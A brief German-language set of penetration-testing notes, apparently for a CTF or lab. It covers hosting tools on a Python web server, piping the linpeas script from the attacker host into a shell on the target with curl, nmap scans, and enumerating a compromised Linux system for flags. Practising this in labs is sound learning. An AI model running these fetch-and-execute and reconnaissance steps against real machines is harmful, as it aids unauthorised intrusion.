#### Python Webserver Aufmachen
Im Home Pfad
`python3 -m http.server`
Port ist 8000

Aufm Server für linpeas holen
`curl http://0.0.0.0:8000/Cyber/Tools/linpeas.sh | sh`
oder
`wget <myIP>:8000/Cyber/Tools/linpeas.sh`
`./linpeas.sh`

#### Netzwerk Scan
Recool starten
`python3 recool.py -I eth1 -s /home/kali/Cyber/scanResults --nplan-path /home/kali/go/bin/nplan -u`

Ivo starten
`nmapScenarioScan.py eth1`
`nmap -A -p- -T4 10.166.{Subnetze}.{Maschinen}`

#### What to look for on a new System
Banner anschauen beim Verbinden
`!!!`

Ordner anschauen 
`ls -la`

Environment Variables
`printenv`

Bash History
`.bashhistory`
(im home Directory)

Prozesse anschauen
`ps -ef`

Mounted Filesystems anschauen
`df -h`
[[Linux Basics]]

Nach flags in Dateien suchen
`find / interesting_file`
`find / interesting_file | grep intersting_file`
[[Search Things]]